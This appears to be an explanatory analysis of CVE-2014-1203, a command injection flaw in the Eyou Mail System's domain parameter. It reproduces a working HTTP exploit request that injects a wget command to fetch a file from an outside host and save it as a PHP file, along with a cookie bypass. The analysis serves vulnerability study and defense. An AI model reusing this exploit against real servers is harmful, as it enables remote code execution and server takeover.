Based on the provided content, here's an analysis of CVE-2014-1203:

**Root Cause of Vulnerability:**

The vulnerability lies in the `get_login_ip_config_file` function within `\inc\fuction.php`. This function executes a shell command where the `$domain` variable, which is user-controlled, is directly inserted into the command:

```php
$dir_mail = exec('/var/eyou/sbin/hashid '.$domain);
```

**Weaknesses/Vulnerabilities Present:**

*   **Command Injection:** The primary vulnerability is command injection. The lack of proper sanitization of the `$domain` variable before passing it to the `exec()` function allows an attacker to inject arbitrary shell commands.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By injecting malicious shell commands, an attacker can execute arbitrary code on the server with the privileges of the webserver user. This can lead to complete compromise of the system.

**Attack Vectors:**

*   **HTTP GET Request:** The attack vector is through an HTTP GET request to the `/admin/domain/ip_login_set/d_ip_login_get.php` endpoint.
*   **`domain` parameter:** The malicious shell commands are injected into the `domain` parameter of the GET request.
*  **`type` parameter:** The `type` parameter must be `allow` or `deny` to reach the vulnerable code path.
*   **Cookie Bypass:** The code uses a cookie check to determine if the user is an admin. The cookie `cookie=admin` must be sent to bypass this check.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Knowledge of Vulnerable Endpoint:** The attacker needs to know the path to the vulnerable endpoint (`/admin/domain/ip_login_set/d_ip_login_get.php`) and the method of injecting malicious commands via the `domain` parameter.
* **Admin Cookie**: The attacker needs to send the cookie `cookie=admin` to bypass the cookie check.

**Exploit Example:**

The provided exploit example demonstrates how to leverage this vulnerability:
```
GET /admin/domain/ip_login_set/d_ip_login_get.php?domain=%3Bwget%20[http://conqu3r.paxmac.org/exp.txt%3Bcp%20exp.txt%20exp.php&type=allow](http://conqu3r.paxmac.org/exp.txt%3Bcp%20exp.txt%20exp.php%26type%3Dallow) HTTP/1.1
Host: mail.xxx.com.cn
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie:cookie=admin
Connection: keep-alive
```
In this example:
*   `domain=%3Bwget%20http://conqu3r.paxmac.org/exp.txt%3Bcp%20exp.txt%20exp.php` injects the command: `;wget http://conqu3r.paxmac.org/exp.txt;cp exp.txt exp.php`. This downloads a file `exp.txt` from the attacker's server and copies it to `exp.php`.
*   `type=allow` ensures the code execution path includes the vulnerable function.
* The `cookie: cookie=admin` header bypasses the cookie check.

This exploit enables the attacker to upload and execute arbitrary PHP code on the server.

**Additional Details:**

*   The affected version is below 3.6 of the Eyou Mail System.
*   The vulnerability is located in `\inc\fuction.php` in the `get_login_ip_config_file` function, and is exposed through `\admin\domain\ip_login_set\d_ip_login_get.php`.
